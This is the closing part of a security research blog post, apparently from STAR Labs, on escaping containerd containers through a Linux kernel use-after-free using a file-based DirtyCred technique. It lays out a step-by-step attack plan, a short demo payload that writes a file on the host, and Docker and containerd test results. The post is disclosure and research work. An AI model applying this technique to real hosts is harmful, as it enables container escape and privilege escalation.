<p>After I spent a few attempts experimenting with various ideas which didn’t work too well, Billy suggested adapting <a href="https://gist.github.com/pqlx/b1ed41e7557c042bcc7a8c74ea1feae8">this method</a> to significantly increase the delay created by a page fault (image from Google CTF discord):</p>
<p><img loading="lazy" src="./A new method for container escape using file-based DirtyCred _ STAR Labs_files/07-container-escape-using-file-based-DirtyCred_003.png" alt="">
</p>
<p><a href="https://elixir.bootlin.com/linux/v6.0-rc5/source/mm/shmem.c#L2061"><code>shmem_fault()</code></a> contains a helpful comment which explains why this is the case:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c hljs" data-lang="c"><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment">/*
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> * Trinity finds that probing a hole which tmpfs is punching can
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> * prevent the hole-punch from ever completing: which in turn
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> * locks writers out with its hold on i_rwsem.  So refrain from
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> * faulting pages into the hole while it's being punched.  Although
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> * shmem_undo_range() does remove the additions, it may be unable to
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> * keep up, as each new page needs its own unmap_mapping_range() call,
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> * and the i_mmap tree grows ever slower to scan if new vmas are added.
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> *
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> * It does not matter if we sometimes reach this check just before the
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> * hole-punch begins, so that one fault then races with the punch:
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> * we just need to make racing faults a rare case.
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> *
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> * The implementation below would be much simpler if we just used a
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> * standard mutex or completion: but we cannot take i_rwsem in fault,
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> * and bloating every shmem inode for this unlikely case would be sad.
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment"> */</span></span>
</span></span></code></pre></div><h3 id="putting-it-all-together">Putting it all together<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#putting-it-all-together">#</a></h3>
<p>In summary, our plan of attack is as follows:</p>
<ol>
<li>Open some random file, file A, with access mode <code>O_RDWR</code>. The kernel will allocate a corresponding <code>file</code> struct.</li>
<li>Using the vulnerability, repeatedly decrement the refcount of file A’s <code>file</code> struct <strong>until it underflows</strong>. This frees it, although the file descriptor table still contains a reference to it.</li>
</ol>
<blockquote>
<p>Note: this is necessary, because <code>fget()</code> (which will be called when we submit the AIO request later) will cause the kernel to stall if called on a <code>file</code> struct with refcount 0. The offending code is <a href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/file.c#L882">here</a> (check the macro expansion of <code>get_file_rcu</code>).</p>
</blockquote>
<ol start="3">
<li>Create and obtain a file descriptor for a temporary file B using <code>memfd_create()</code>. Allocate a large amount of memory to it using <code>fallocate()</code>.</li>
<li>Prepare an AIO request using a buffer that lies across a page boundary. The second page should be backed by file B, and not yet be resident in memory.</li>
<li>(CPU 1, thread X): Call <code>fallocate()</code> on file B with mode <code>FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE</code>.</li>
<li>(CPU 1, thread Y): Submit the AIO request. This triggers a page fault for the page backed by file B. As a hole punch is in progress, thread Y will <a href="https://elixir.bootlin.com/linux/v6.0-rc5/source/mm/shmem.c#L2086">put itself on a wait queue</a>, stalling execution until thread X is done.</li>
<li>(CPU 0, thread Z): While thread Y is stalled, repeatedly call <code>open()</code> on <code>/proc/sys/kernel/modprobe</code> to spray the heap with corresponding <code>file</code> structs, overwriting file A’s <code>file</code> struct with that of <code>/proc/sys/kernel/modprobe</code>.</li>
<li>Thread Y resumes execution and the write is performed on <code>/proc/sys/kernel/modprobe</code>.</li>
</ol>
<p>You can find the source code for the exploit <a href="https://starlabs.sg/blog/2023/07-container-escape-using-file-based-DirtyCred_source.zip">here</a>.</p>
<h3 id="testing-against-actual-containers">Testing against actual containers<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#testing-against-actual-containers">#</a></h3>
<p>Once all that was done, I proceeded to try my exploit against some test containers I set up on a vulnerable Ubuntu Kinetic image. This was NOT running kernel version v6.0-rc5, but there were little to no changes to any code relevant to the exploit, so this should not be a problem.</p>
<blockquote>
<p>Note: More specifically, I used <a href="https://cloud-images.ubuntu.com/kinetic/current/kinetic-server-cloudimg-amd64.img">this image</a>, then downgraded the kernel manually to an affected version (ubuntu 5.19.0-21-generic).</p>
</blockquote>
<p>To demonstrate a successful container escape without making things too complicated, I opted for a simple payload which creates a file on the host’s system (outside the container):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh hljs bash" data-lang="sh"><span class="line"><span class="cl"><span class="cp"><span class="hljs-meta">#!/bin/sh</span>
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nv">path</span><span class="o">=</span><span class="k">$(</span>sed -n <span class="s1"><span class="hljs-string">'s/.*\perdir=\([^,]*\).*/\1/p'</span></span> /proc/mounts<span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nb"><span class="hljs-built_in">echo</span></span> <span class="s2"><span class="hljs-string">"container escape"</span></span> &gt; /home/amarok/c
</span></span></code></pre></div><h4 id="standard-docker-container">Standard Docker container<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#standard-docker-container">#</a></h4>
<p>Command: <code>sudo docker run -it --rm ubuntu bash</code></p>
<p>Surprisingly, my exploit did <strong>not</strong> work against the first test target. Instead, I received <code>Permission denied</code> instead. What’s going on?</p>
<p>As it turns out, after the call to <code>aio_setup_rw()</code>, <code>rw_verify_area()</code> calls a security hook function. By default, Docker containers are run under a restricted AppArmor profile, so the additional permissions check in <a href="https://elixir.bootlin.com/linux/v6.0-rc5/source/security/apparmor/file.c#L598"><code>aa_file_perm()</code></a> fails, causing <code>aio_write()</code> to return without actually carrying out the write operation. 😥</p>
<h4 id="docker-container-with-apparmorunconfined">Docker container with <code>apparmor=unconfined</code><a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#docker-container-with-apparmorunconfined">#</a></h4>
<p>Command: <code>sudo docker run -it --rm --security-opt apparmor=unconfined ubuntu bash</code></p>
<p>If the Docker container is run with <code>apparmor=unconfined</code>, however, <code>aa_file_perm()</code> exits early before the actual permissions check occurs, allowing our exploit to go through just fine.</p>
<p>This scenario isn’t super useful, because it’s unlikely that someone would go out of their way to disable AppArmor on a deployed Docker container.</p>
<h4 id="standard-containerd-container">Standard containerd container<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#standard-containerd-container">#</a></h4>
<p>Command: <code>sudo ctr run -t --rm docker.io/library/ubuntu:latest bash</code></p>
<p>If we instead spin up a container using the <code>ctr</code> command-line client that operates directly on top of containerd’s API, the exploit works just fine as well. That’s neat! We can use this technique to escape out-of-the-box containerd containers. This is a much more realistic use case for this technique. 🙂</p>
<h2 id="demo">Demo<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#demo">#</a></h2>
<p>It’s <del>morbin’</del> <strong>Demo Time</strong>. Here’s a video of the exploit in action against a fresh containerd container:</p>
<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
<iframe src="./A new method for container escape using file-based DirtyCred _ STAR Labs_files/0WZ5nqAQwXc.html" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen="" title="YouTube Video"></iframe>
</div>
<h2 id="acknowledgements">Acknowledgements<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#acknowledgements">#</a></h2>
<p>I would like to thank:</p>
<ul>
<li>My mentor Billy for taking my seemingly-ridiculous idea and managing to help me refine and stabilise it into a new and consistent container escape technique.</li>
<li>Everyone else at Star Labs :)</li>
<li><a href="https://blog.dbouman.nl/">@pql</a> for the slow page technique.</li>
</ul>
<h2 id="references">References<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#references">#</a></h2>
<p>io_uring</p>
<ul>
<li><a href="https://kernel-recipes.org/en/2022/wp-content/uploads/2022/06/axboe-kr2022-1.pdf">https://kernel-recipes.org/en/2022/wp-content/uploads/2022/06/axboe-kr2022-1.pdf</a></li>
<li><a href="https://lwn.net/Articles/863071/">https://lwn.net/Articles/863071/</a></li>
<li><a href="https://github.com/axboe/liburing/wiki/io_uring-and-networking-in-2023#ring-messages">https://github.com/axboe/liburing/wiki/io_uring-and-networking-in-2023#ring-messages</a></li>
</ul>
<p>DirtyCred</p>
<ul>
<li><a href="https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf">https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf</a></li>
<li><a href="https://blog.hacktivesecurity.com/index.php/2022/12/21/cve-2022-2602-dirtycred-file-exploitation-applied-on-an-io_uring-uaf/">https://blog.hacktivesecurity.com/index.php/2022/12/21/cve-2022-2602-dirtycred-file-exploitation-applied-on-an-io_uring-uaf/</a></li>
<li><a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique">https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique</a></li>
</ul>
<p><code>/proc</code> filesystem</p>
<ul>
<li><a href="https://docs.kernel.org/filesystems/proc.html">https://docs.kernel.org/filesystems/proc.html</a></li>
</ul>
<p>Kernel AIO</p>
<ul>
<li><a href="https://blog.cloudflare.com/io_submit-the-epoll-alternative-youve-never-heard-about/">https://blog.cloudflare.com/io_submit-the-epoll-alternative-youve-never-heard-about/</a></li>
</ul>
<p><code>fallocate()</code> slow page</p>
<ul>
<li><a href="https://gist.github.com/pqlx/b1ed41e7557c042bcc7a8c74ea1feae8">https://gist.github.com/pqlx/b1ed41e7557c042bcc7a8c74ea1feae8</a></li>
</ul>
</div>
<footer class="post-footer">
<ul class="post-tags">
</ul>
</footer>
</article>
</main>
<footer class="footer">
<span>© 2023 <a href="https://starlabs.sg/">STAR Labs</a></span>
<span>
Powered by
<a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
<a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
</span>
</footer>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g" style="visibility: visible; opacity: 1;">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
<path d="M12 6H0l6-6z"></path>
</svg>
</a>
<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>


<div id="rememberry__extension__root" style="all: unset;"><template shadowrootmode="open"><main data-reactroot=""><!-- react-empty: 2 --><!-- react-empty: 3 --></main><style type="text/css">.Translator__wrapper__2qJID {
  position: absolute;
  left: 0;
  z-index: 1010;
  width: 100vw;
  opacity: 1;
  transition: opacity 200ms cubic-bezier(0.18, 0.65, 0.26, 0.98), transform 200ms ease-out; }
  .Translator__wrapper__2qJID[data-popup-direction="downward"] {
    top: 0;
    transform: translateY(9px); }
    .Translator__wrapper__2qJID[data-popup-direction="downward"] > .Translator__translation-popup__2_mD4 > .Translator__arrow__3eIZZ {
      top: -8px;
      transform: translateX(-50%) rotate(45deg);
      background-color: #2EC4B6; }
    .Translator__wrapper__2qJID[data-popup-direction="downward"] > .Translator__translation-popup__2_mD4:after {
      top: 0; }
  .Translator__wrapper__2qJID[data-popup-direction="upward"] {
    bottom: 0;
    transform: translateY(-8px); }
    .Translator__wrapper__2qJID[data-popup-direction="upward"] > .Translator__translation-popup__2_mD4 > .Translator__arrow__3eIZZ {
      bottom: -8px;
      transform: translateX(-50%) rotate(-135deg);
      background-color: #FDFFFC; }
    .Translator__wrapper__2qJID[data-popup-direction="upward"] > .Translator__translation-popup__2_mD4:after {
      bottom: 0; }
  .Translator__wrapper__2qJID:not([data-popup-direction="none"]) > .Translator__translation-popup__2_mD4:after {
    position: absolute;
    transform: translateX(-50%);
    width: 32px;
    height: 16px;
    background-color: #FDFFFC;
    content: ''; }
  .Translator__wrapper__2qJID:not([data-popup-direction="none"]) > .Translator__translation-popup__2_mD4 > .Translator__arrow__3eIZZ {
    position: absolute;
    width: 16px;
    height: 16px;
    border-top: 1px solid #2EC4B6;
    border-left: 1px solid #2EC4B6;
    box-shadow: 0 0 8px rgba(1, 22, 39, 0.3); }
  .Translator__wrapper__2qJID.Translator__in__3rwf1 {
    transform: translateY(0); }
  .Translator__wrapper__2qJID.Translator__in__3rwf1, .Translator__wrapper__2qJID.Translator__out__3AHaS {
    opacity: 0; }
  .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 {
    position: absolute;
    display: flex;
    min-width: 180px;
    max-width: 360px;
    border: 1px solid #2EC4B6;
    border-radius: 4px;
    box-shadow: 0 0 8px rgba(1, 22, 39, 0.3);
    flex-direction: column;
    color: #011627;
    background-color: #FDFFFC; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-10%"] {
      transform: translateX(-10%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-10%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-10%"]:after {
        left: 10%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-20%"] {
      transform: translateX(-20%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-20%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-20%"]:after {
        left: 20%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-30%"] {
      transform: translateX(-30%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-30%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-30%"]:after {
        left: 30%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-40%"] {
      transform: translateX(-40%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-40%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-40%"]:after {
        left: 40%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-50%"] {
      transform: translateX(-50%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-50%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-50%"]:after {
        left: 50%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-60%"] {
      transform: translateX(-60%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-60%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-60%"]:after {
        left: 60%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-70%"] {
      transform: translateX(-70%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-70%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-70%"]:after {
        left: 70%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-80%"] {
      transform: translateX(-80%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-80%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-80%"]:after {
        left: 80%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-90%"] {
      transform: translateX(-90%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-90%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-90%"]:after {
        left: 90%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl {
      z-index: 1;
      display: flex;
      height: 30px;
      background-color: #2EC4B6; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__btn__2x0P5 {
        display: inline-block;
        width: 30px;
        height: 30px;
        outline: none;
        flex-shrink: 0;
        color: #FDFFFC;
        font-size: 18px;
        line-height: 30px;
        text-align: center;
        text-shadow: 0 1px #20897f; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__btn__2x0P5:focus {
          color: #cc7f16; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__btn__2x0P5:active:not(.Translator__disabled__Cwgfb) {
          text-shadow: 0 -1px #20897f; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__btn__2x0P5.Translator__disabled__Cwgfb {
          color: #b8ebe6; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV {
        vertical-align: top;
        display: inline-flex;
        margin: 5px 5px;
        flex-grow: 1;
        justify-content: center; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > i {
          margin-left: 2px;
          color: #FDFFFC; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw {
          position: relative;
          display: inline-flex; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw > select, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw > select:hover {
            border: none;
            box-shadow: rgba(1, 22, 39, 0.078) 0 1px 0, rgba(253, 255, 252, 0.74) 0 1px 2px inset;
            border-radius: 5px;
            color: #011627;
            text-shadow: none;
            background-image: none;
            background-color: rgba(253, 255, 252, 0.9);
            cursor: pointer;
            -webkit-appearance: menulist;
            font-size: 12px;
            background-color: #FDFFFC; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw > select.Translator__true-select__1H8eq {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            opacity: 0; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw > select.Translator__fake-select__TiLW- {
            vertical-align: top;
            min-width: 40px;
            pointer-events: none; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo {
      position: relative;
      min-height: 30px;
      padding: 16px 5px; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translated-from__EL6tK {
        position: absolute;
        top: 4px;
        right: 8px;
        color: #2EC4B6;
        font-size: 12px;
        cursor: help; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__original__vxGtw {
        max-height: 116px;
        margin-bottom: 7px;
        padding: 0 8px;
        font-style: italic;
        word-break: break-word;
        overflow: auto; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__original__vxGtw > .Translator__pronunciation-btn__1kbhJ {
          display: inline-block;
          width: 22px;
          margin-right: 8px; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__original__vxGtw > .Translator__transcription-loader__3c8Vr {
          margin-top: 5px;
          text-align: center;
          cursor: help; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__original__vxGtw > .Translator__transcription__T_fKH {
          margin-top: 5px;
          margin-left: 30px;
          font-style: italic; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j {
        max-height: 250px;
        padding: 0 8px;
        overflow: auto; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U:not(:first-child) {
          margin-top: 10px; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr {
          display: flex;
          border-bottom: 1px dotted #b8ebe6;
          justify-content: flex-end;
          color: #73d7ce;
          font-size: .9em;
          font-style: italic; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg {
            flex-grow: 1;
            text-align: left; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg > i.Translator__upside-down__2XYYt:before {
              transform: rotate(180deg);
              display: inline-block; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg > i:before {
              margin: 0; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg:hover, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg:focus {
              color: #2EC4B6; }
              .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg:hover > i, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg:focus > i {
                transform: scale(1.2);
                display: inline-block; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ {
          display: flex;
          min-height: 28px;
          padding: 4px 0;
          align-items: center;
          cursor: pointer; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI {
            display: inline-flex;
            width: 14px;
            height: 14px;
            margin-right: 5px;
            border: 1px solid #011627;
            border-radius: 2px;
            outline: none;
            flex-shrink: 0;
            justify-content: center;
            align-items: center; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI > i {
              display: none;
              color: #011627;
              font-size: 11px; }
              .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI > i:before {
                margin: 0; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI:focus {
              border-color: #cc7f16; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI.Translator__checked__REDlo > i {
              display: inline; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ:hover > .Translator__checkbox__cgTFI {
            box-shadow: inset 0 0 4px #73d7ce; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__term__3UT78 {
            min-height: 20px;
            max-height: 116px;
            flex-grow: 1;
            word-break: break-word;
            overflow: auto; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > input {
            text-overflow: ellipsis;
            white-space: nowrap;
            overflow: hidden;
            width: 0;
            padding: 0;
            border: none;
            flex-grow: 1;
            font-size: 15px;
            line-height: 20px; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__add-custom__2QhtK {
          display: flex;
          width: 14px;
          height: 14px;
          margin-top: 7px;
          border: 1px solid #011627;
          border-radius: 2px;
          outline: none;
          justify-content: center;
          align-items: center; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__add-custom__2QhtK > i {
            color: #1f837a;
            font-size: 10px; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__add-custom__2QhtK > i:before {
              margin: 0; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__add-custom__2QhtK:focus {
            border-color: #cc7f16; }
</style><style type="text/css">.Button__btn__1lr0f:not(.Button__keep-cursor__V97qw) {
  cursor: pointer; }
  .Button__btn__1lr0f:not(.Button__keep-cursor__V97qw).Button__disabled__38AlQ {
    cursor: not-allowed; }
</style><style type="text/css">@charset "UTF-8";
/* stylelint-disable */
.icon-pencil:before {
  content: '\E800'; }

/* 'î €' */
.icon-ok:before {
  content: '\E801'; }

/* 'î ' */
.icon-ccw:before {
  content: '\E802'; }

/* 'î ‚' */
.icon-globe:before {
  content: '\E803'; }

/* 'î ƒ' */
.icon-info-circled:before {
  content: '\E804'; }

/* 'î „' */
.icon-cancel:before {
  content: '\E805'; }

/* 'î …' */
.icon-edit:before {
  content: '\E806'; }

/* 'î †' */
.icon-plus:before {
  content: '\E807'; }

/* 'î ‡' */
.icon-bookmark:before {
  content: '\E808'; }

/* 'î ˆ' */
.icon-settings:before {
  content: '\E809'; }

/* 'î ‰' */
.icon-down-1:before {
  content: '\E80A'; }

/* 'î Š' */
.icon-up-1:before {
  content: '\E80B'; }

/* 'î ‹' */
.icon-heart:before {
  content: '\E80C'; }

/* 'î Œ' */
.icon-export:before {
  content: '\E80D'; }

